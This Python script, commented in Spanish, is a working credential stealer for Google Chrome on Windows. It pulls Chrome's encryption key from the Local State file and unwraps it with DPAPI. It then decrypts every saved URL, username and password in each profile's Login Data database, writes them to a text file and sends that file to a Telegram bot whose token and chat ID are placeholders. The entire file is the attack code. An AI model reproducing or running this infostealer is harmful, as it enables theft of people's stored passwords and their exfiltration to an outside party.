import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import telebot

# Tu token de autenticación de Telegram
token = 'TOKEN_TELEGRAM'
bot = telebot.TeleBot(token)

# Ruta del archivo de texto para guardar las contraseñas
txt_file = 'contraseñas.txt'

# GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Obtener la clave secreta desde el archivo local state de Chrome
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Eliminar el sufijo DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] No se puede encontrar la clave secreta de Chrome")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Vector de inicialización para el descifrado AES
        initialisation_vector = ciphertext[3:15]
        #(3-b) Obtener la contraseña cifrada eliminando los bytes de sufijo (últimos 16 bits)
        # La contraseña cifrada tiene 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Construir el cifrado para descifrar la contraseña
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] No se puede descifrar, no se admite la versión de Chrome <80. Por favor, verifica.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] No se puede encontrar la base de datos de Chrome")
        return None
        
if __name__ == '__main__':
    try:
        # Crear un archivo de texto para almacenar las contraseñas
        with open(txt_file, 'w', encoding='utf-8') as passwords_file:
            #(1) Obtener la clave secreta
            secret_key = get_secret_key()
            passwords = []  # Lista para almacenar las contraseñas
            # Buscar el perfil de usuario o la carpeta predeterminada (aquí es donde se almacena la contraseña de inicio de sesión cifrada)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Obtener el texto cifrado de la base de datos SQLite
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filtrar el vector de inicialización y la contraseña cifrada del texto cifrado
                            #(4) Utilizar el algoritmo AES para descifrar la contraseña
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Secuencia: %d"%(index))
                            print("URL: %s\nNombre de usuario: %s\nContraseña: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            #(5) Guardar en la lista de contraseñas
                            passwords.append(f"Secuencia: {index}\nURL: {url}\nNombre de usuario: {username}\nContraseña: {decrypted_password}\n")
                    
                    # Escribir todas las contraseñas en el archivo de texto
                    passwords_file.write('\n'.join(passwords))
                    
                    #(6) Enviar el archivo de texto a Telegram
                    with open(txt_file, 'r', encoding='utf-8') as file:
                        bot.send_document(chat_id='CHAT_ID', document=file)
                    print("Archivo enviado a Telegram")
                    
                    # Cerrar la conexión de la base de datos
                    cursor.close()
                    conn.close()
                    # Eliminar la base de datos temporal
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))
